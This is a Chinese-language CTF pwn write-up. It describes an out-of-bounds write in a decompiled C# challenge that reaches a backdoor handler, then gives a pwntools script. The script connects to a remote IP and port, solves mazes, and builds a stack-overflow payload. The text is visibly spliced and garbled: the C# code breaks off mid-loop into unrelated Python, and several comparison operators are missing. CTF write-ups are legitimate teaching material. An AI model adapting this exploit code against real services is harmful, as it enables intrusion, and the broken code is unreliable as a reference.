## pwn
###  mengyedekending
反编译得到源码，漏洞点在，可以输入’\r’来控制（*prt2），得到数组的越界写，改写ptr2[2]中的指针，指向num，然后用offset那里-1就好了。
    反编译得到源码 
    ​```c# 
    private unsafe static void Main(string[] args) 
    { 
     char* ptr = stackalloc char[(UIntPtr)100]; 
     int num = 1; 
     int* ptr2 = (int*)(ptr + 50); 
     Program @object = new Program(); 
     Program.MsgHandler msgHandler = new Program.MsgHandler(@object.Right); 
     Program.MsgHandler msgHandler2 = new Program.MsgHandler(@object.Backdoor); 
     Console.WriteLine("This is a gift for you : {0:x4}", &num); 
     Console.WriteLine("What do you want me to repeat?"); 
     ptr2[1] = 0; 
     ptr2[2] = ptr; 
     *ptr2 = 0; 
     while (ptr2[1]  sol[i][1]): 
                res += 'a' 
            elif (tmp[0] == sol[i][0]) and (tmp[1]  sol[i][0]) and (tmp[1] == sol[i][1]): 
                res += 'w' 
            else: 
                res += 's' 
            tmp = sol[i] 
    #    fix(res) 
    #    final(res) 
    step = [] 
    def check_valid(mg, x, y): 
        if x >= 0 and x = 0 and y < len(mg[0]) and mg[x][y] == 1: 
            return True 
        else: 
            return False 
    def process1(step): 
        change_records = [] 
        for i in range(len(step) - 1): 
            if (abs(step[i][0] - step[i + 1][0]) == 0 and abs(step[i][1] - step[i + 1][1]) == 1) or (abs(step[i][0] - step[i + 1][0]) == 1 and abs(step[i][1] - step[i + 1][1]) == 0): 
                pass 
            else: 
                change_records.append(i + 1) 
        # print(change_records) 
        clip_nums = [] 
        for i in change_records: 
            for j in range(i): 
                if (abs(step[j][0] - step[i][0]) == 0 and abs(step[j][1] - step[i][1]) == 1) or \ 
                        (abs(step[j][0] - step[i][0]) == 1 and abs(step[j][1] - step[i][1]) == 0): 
                    break 
            clip_nums.append((j, i)) 
        # print(clip_nums) 
        record = [] 
        for i in clip_nums[::-1]: 
            if not (i[0] in record or i[1] in record): 
                step = step[:i[0] + 1] + step[i[1]:] 
            record += list(range(i[0], i[1])) 
        # print(step) 
        translate(step) 
    def final(re): 
        print("Walk success!") 
        print(re) 
    def walk(mg, x, y, ex, ey): 
        global step 
        if x == ex and y == ey: 
            step.append((x, y)) 
            process1(step) 
            # sys.exit() 
        if check_valid(mg, x, y): 
            step.append((x, y)) 
            mg[x][y] = 2 
            walk(mg, x, y + 1, ex, ey) 
            walk(mg, x, y - 1, ex, ey) 
            walk(mg, x - 1, y, ex, ey) 
            walk(mg, x + 1, y, ex, ey) 
    def get_xy(maze,k): 
     for i in range(k): 
      for j in range(k): 
       if(maze[i][j] == '4'): 
        x = i 
        y = j 
            for i in range(k): 
                    for j in range(k): 
                            if(maze[i][j] == '3'): 
                                    ex = i 
                                    ey = j 
     return (x,y,ex,ey) 
    def pwn(): 
    # cn = process('./pwn') 
     cn = remote('81.68.174.63',62176) 
     for j in range(0,100): 
      print(j+1) 
      global res 
      global step 
      step = [] 
      res = '' 
      cn.recvline() 
      maze=[] 
      maze = cn.recvlines(6+j) 
      num = len(maze) 
      x=0 
      y=0 
      ex=0 
      ey=0 
      for k in range(0,num): 
       maze[k] = maze[k].replace('\xe2\xac\x9b','0') 
       maze[k] = maze[k].replace('\xe2\xac\x9c','1') 
       maze[k] = maze[k].replace('\xf0\x9f\x9a\xa9','3') 
      # print(maze[k]) 
      for k in range(0,num): 
       for i in range(0,len(maze[k])): 
        if maze[k][i] != '0' and maze[k][i] != '1' and maze[k][i] != '3': 
         maze[k]=maze[k][:i]+'4'+maze[k][i+4:] 
         break 
      (x,y,ex,ey) = get_xy(maze,num) 
      for k in range(0,num): 
       maze[k] = maze[k].replace('3','1') 
       maze[k] = maze[k].replace('4','1') 
      box=[[]for i in range(num)] 
      for k in range(0,num): 
       for L in range(0,num): 
        box[k].append(int(maze[k][L])) 
      #print(box) 
      maze = box 
      #print(x,y,ex,ey) 
      walk(maze,x,y,ex,ey) 
      cn.send(res+'\n') 
      print(res) 
     base=0x555555554000 
     stack_ = 0xc000000000 
     ret = base+0xa3910 
     payload = 'a'*112+p64(0xc000009690)+p64(0x200)+'b'*0x90+'\xce' 